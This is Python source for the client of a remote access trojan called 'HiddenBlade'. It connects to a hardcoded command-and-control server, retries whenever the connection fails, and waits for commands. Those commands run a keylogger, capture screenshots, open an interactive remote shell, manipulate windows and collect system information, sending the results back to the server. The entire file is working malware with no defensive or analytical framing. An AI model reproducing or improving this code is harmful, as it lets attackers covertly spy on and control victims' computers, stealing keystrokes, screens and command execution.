from time import sleep
from threading import Thread
from util.hidden_blade_components import HiddenBladeComponent
import os
import socket
import sys

class Client(socket.socket):
    def __init__(self) -> None:
        super().__init__(socket.AF_INET,socket.SOCK_STREAM)
        self.connect(("192.168.1.5",1881))
        Thread(target=self.comminication()).start()

    def comminication(self):
        cc = HiddenBladeComponent.ClientCommands()
        while(True):
            commands = self.recv(1024).decode()
            if commands == "get-info":
                self.send(str(cc.get_info()).encode())

            elif commands == "k-lgr":
                cc.makeKeylogger()
                self.send(b"Finish")
                with open("log.txt","r",encoding="utf-8") as f:
                    self.send(f.read().encode())
                os.remove("log.txt")

            elif commands == "get-screen_s":
                cc.screenShot()
                with open(f"{HiddenBladeComponent.test_konumu}ss.png","rb") as ss:
                    data = ss.read()
                    data_lenght = len(data)
                    self.send(data_lenght.to_bytes(4,'big'))
                    self.send(data)
                os.remove(f"{HiddenBladeComponent.test_konumu}ss.png")
            
            elif commands == "i-shell":
                while True:
                    cmd = self.recv(1024).decode()
                    if cmd != "e--":
                        resp = cc.terminalCommands(cmd)
                        result = { str(len(resp)) : resp }
                        self.send(str(result).encode())
                        self.send(resp.encode())

                    if cmd == "e--":
                        cc.terminalCommands(cmd)
                        break
            
            elif commands == "win-map":
                while True:
                    cmd = self.recv(1024).decode()
                    if cmd != "e--":
                        try:
                            self.send(cc.winManupilation(cmd).encode())
                        except:
                            self.send(b" ")
                    else:
                        self.send(b"exited")
                        break
def main():
    try:
        Client()
    except ConnectionRefusedError:
        main()
main()